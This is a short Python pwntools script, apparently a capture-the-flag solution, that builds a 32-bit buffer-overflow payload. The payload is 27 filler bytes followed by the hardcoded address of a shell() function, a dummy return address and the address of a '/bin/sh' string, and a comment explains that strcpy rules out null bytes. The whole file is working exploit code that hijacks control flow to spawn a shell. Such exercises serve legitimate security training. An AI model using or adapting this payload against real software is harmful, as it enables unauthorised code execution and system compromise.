from pwn import *

shell_addr = 0x080486bd
bin_sh_addr = 0x80487d0

"""
[shell() locals]
[shell() saved ebp]
[return address]
[shell() cmd param]                 <---- highest address
"""

# buffer overflow with strcpy() therefore we can't have any null terminator bytes in our payload
payload = b"A" * 27
payload += p32(shell_addr)
payload += b"BBBB" # ret addr for shell()
payload += p32(bin_sh_addr)

print(payload)